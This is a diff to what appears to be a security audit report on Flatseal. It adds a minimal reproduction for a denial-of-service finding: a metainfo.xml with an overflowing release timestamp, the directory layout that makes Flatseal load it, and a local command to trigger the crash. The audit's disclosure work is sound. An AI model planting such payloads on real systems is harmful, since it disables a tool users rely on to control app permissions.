@@ -295,6 +295,27 @@ poisons enumeration of ALL apps. This is a functional DoS of the security tool, 
 
 Minimal payload (metainfo.xml): `<releases><release version="1.0" timestamp="9999999999999999"/></releases>`.
 
+**Minimal reproducible sample (verified value + layout):**
+Payload file `…/files/share/metainfo/com.evil.App.metainfo.xml`:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<component type="desktop-application">
+  <id>com.evil.App</id>
+  <name>Evil</name>
+  <releases><release version="1.0" timestamp="8640000000001"/></releases>
+</component>
+```
+`8640000000001` is the exact minimal trigger (`8640000000000`→OK, `+1`→RangeError; larger values also
+work — AppStream clamps to INT64_MAX which still overflows). Required tree (Flatseal lists an app when
+`<install>/app/<id>/current/active` exists):
+```
+<root>/app/com.evil.App/current/active/metadata                                  (any valid keyfile)
+<root>/app/com.evil.App/current/active/files/share/metainfo/com.evil.App.metainfo.xml   (payload)
+```
+Trigger locally with the test-suite env mechanism: `FLATPAK_SYSTEM_DIR=<root> FLATPAK_USER_DIR=<empty>
+gjs -m src/main.js` → `getAll()` throws → window never appears. (Value + layout verified via node/code
+trace; full GTK run not executed here — no gjs/GTK in the audit env.)
+
 ### C2 — DoS: unguarded `load_from_file` on malformed `metadata` crashes when app is opened (CONFIRMED)
 
 **File:** `src/models/applications.js:246-247` (`getMetadataForAppId`)
